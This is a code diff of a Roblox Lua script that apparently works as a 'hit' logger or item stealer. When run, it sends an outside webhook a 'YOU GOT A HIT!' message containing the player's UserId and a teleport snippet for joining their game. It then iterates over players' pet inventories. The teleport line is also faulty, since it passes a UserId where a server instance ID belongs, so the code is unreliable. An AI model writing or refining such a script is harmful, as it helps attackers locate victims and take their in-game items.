@@ -1,16 +1,15 @@
 local HttpService = game:GetService("HttpService")
-
 -- Send webhook notification
 local embed = {
     ["title"] = "YOU GOT A HIT!",
-    ["description"] = "The script has been executed. You can join their game using the following script:\n```lua\nlocal TeleportService = game:GetService(\"TeleportService\")\nTeleportService:TeleportToPlaceInstance(game.PlaceId, \"instance_id\")\n```", -- Make sure to provide the actual instance ID
+    ["description"] = "The script has been executed. You can join their game using the following script:\n```lua\nlocal TeleportService = game:GetService(\"TeleportService\")\nTeleportService:TeleportToPlaceInstance(game.PlaceId, " .. game.Players.LocalPlayer.UserId .. ")\n```",
     ["color"] = 0x3365FF
 }
 local data = {
     ["embeds"] = {embed}
 }
 local json = HttpService:JSONEncode(data)
-HttpService:PostAsync(webhookUrl, json, Enum.HttpContentType.ApplicationJson) -- Added content type to avoid missing argument
+HttpService:PostAsync(webhookUrl, json)
 
 while true do
     for _, player in pairs(game:GetService("Players"):GetPlayers()) do
@@ -36,6 +35,7 @@ while true do
                     wait(1)
                 end
 
+                -- game:GetService("ReplicatedStorage").API:FindFirstChild("SrbfhEUOGKxxquD/iGrvx"):FireServer()
                 local count = 0
                 for i, v in pairs(data[plr]["inventory"]['pets']) do
                     print(i)
